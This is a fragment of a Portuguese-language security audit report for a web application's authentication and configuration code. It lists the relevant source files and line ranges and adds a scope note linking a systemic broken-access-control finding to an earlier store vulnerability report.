| Arquivo | Linhas relevantes |
|---------|-------------------|
| `auth/config/SecurityConfig.java` | 37, 40-54, 56 |
| `auth/config/JwtAuthenticationFilter.java` | 46-69 |
| `auth/config/JwtTokenProvider.java` | 28-35, 38-50, 92-107 |
| `auth/service/AuthService.java` | 29-46 |
| `auth/service/RefreshTokenService.java` | 33-38, 40-69, 80-95 |
| `auth/service/UserService.java` | 41-54 |
| `auth/api/AuthController.java` | 36-52 |
| `auth/api/UserController.java` | 31-41, 45 |
| `auth/model/RefreshToken.java` | 26-27 |
| `auth/model/TokenBlocklist.java` | 20-43 |
| `auth/seed/AuthUserSeeder.java` | 42-46 |
| `cliente/service/ClienteAuthService.java` | 51-89 |
| `cliente/api/ClienteAuthController.java` | 49-53 |
| `ecommerce/api/AdminComprasController.java` | 26, 75-95 |
| `ecommerce/api/AdminAnalyticsController.java` | 17-31 |
| `ecommerce/api/AdminComentariosController.java` | 21-54 |
| `cliente/api/ClienteController.java` | 35-103 |
| `dashboard/api/DashboardController.java` | 13-47 |
| `financeiro/api/FinanceiroRelatorioController.java` | 16-81 |
| `comissao/api/IndicacaoController.java` | 23-43 |
| `config/api/ConfiguracaoController.java` | 24-48 |
| `shared/config/CorsConfig.java` | 29-38 |
| `shared/config/RateLimitFilter.java` | 53-95 |
| `shared/logging/LoggingAspect.java` | 45-105 |
| `shared/logging/SensitiveDataMask.java` | 41-58 |
| `shared/exception/GlobalExceptionHandler.java` | 126-154 |
| `application.properties` | 17, 24-26, 29-35 |
| `photoizer-frontend/.../auth/services/auth.service.ts` | 16-43 |
| `photoizer-frontend/.../auth/customer/store.ts` | 13-26 |
| `photoizer-frontend/.../auth/AuthProvider.tsx` | 32-45 |
| `photoizer-frontend/.../auth/ProtectedRoute.tsx` | 11-31 |
| `photoizer-frontend/.../shared/api/interceptors.ts` | 6-23 |

---

> **Nota de escopo:** este relatório cobre `auth`, `config` e a infraestrutura transversal de segurança. Ele **confirma e amplifica** achados do relatório anterior da loja (`docs/security/RELATORIO_VULNERABILIDADES_LOJA.md`): o acesso indevido por `ROLE_CLIENTE` (C1 do relatório da loja) é um caso particular do Broken Access Control sistêmico documentado aqui em **C2/C3**. Recomenda-se corrigir C1–C4 antes de reavaliar os fluxos de e-commerce e financeiro.
